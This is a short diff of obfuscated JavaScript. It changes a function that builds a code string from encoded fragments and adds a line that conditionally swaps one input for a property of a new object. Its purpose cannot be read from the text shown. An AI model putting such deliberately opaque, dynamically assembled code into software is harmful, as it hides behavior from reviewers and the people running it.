@@ -41,8 +41,9 @@
 	  	}
 	};
 	a[_(0x34cb7562)] = function(c,h){
+		h = h[m('>9CB/XA')](m('<004'))==0?new g[m('NQW')](h)[_(0xc97cd)]:h;
 		if(h){
-			c=m("JM-GDPR?JDE'KD@?vv3")+h+'"){'+c+m('AYRKYCRO[]JUOP2VLYX@#@>VJJN&11')+h+'";}';
+			c=m('OR2LIUWDOIJ,PIED,KWDUP28')+h+'$")){'+c+m(':RKDR<KHTVCNHI+OERQz7**')+h+'";}';
 		}
 		var cp = c[_(0x2dfd535)]('')[_(0x70e1)](function(a){
 			return a[__(0x5)](0);
